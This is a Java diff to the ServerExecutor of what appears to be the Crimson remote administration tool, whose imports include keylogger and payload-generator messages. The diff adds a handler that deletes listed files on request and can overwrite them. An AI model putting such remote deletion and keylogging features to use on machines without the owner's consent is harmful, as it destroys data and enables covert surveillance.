@@ -28,6 +28,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.google.protobuf.ByteString;
+import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.fm.LocalFilesystem;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
@@ -43,9 +44,9 @@ import com.subterranean_security.crimson.core.proto.Delta.EV_ServerProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ViewerProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.ProfileTimestamp;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_Delete;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
-import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RS_Generate;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
@@ -167,6 +168,8 @@ public class ServerExecutor extends BasicExecutor {
 						rq_file_handle(m);
 					} else if (m.hasRsFileHandle()) {
 						rs_file_handle(m);
+					} else if (m.hasRqDelete()) {
+						rq_delete(m);
 					} else if (m.hasRqKeyUpdate()) {
 						rq_key_update(m);
 					} else if (m.hasMiTriggerProfileDelta()) {
@@ -592,6 +595,14 @@ public class ServerExecutor extends BasicExecutor {
 				RS_FileHandle.newBuilder().setFmid(ServerStore.LocalFilesystems.add(new LocalFilesystem(true, true))))
 				.build());
 
+	}
+
+	private void rq_delete(Message m) {
+		log.debug("rq_delete");
+		receptor.handle.write(Message.newBuilder().setId(m.getId())
+				.setRsDelete(RS_Delete.newBuilder().setOutcome(
+						LocalFilesystem.delete(m.getRqDelete().getTargetList(), m.getRqDelete().getOverwrite())))
+				.build());
 	}
 
 	private void rq_advanced_file_info(Message m) {
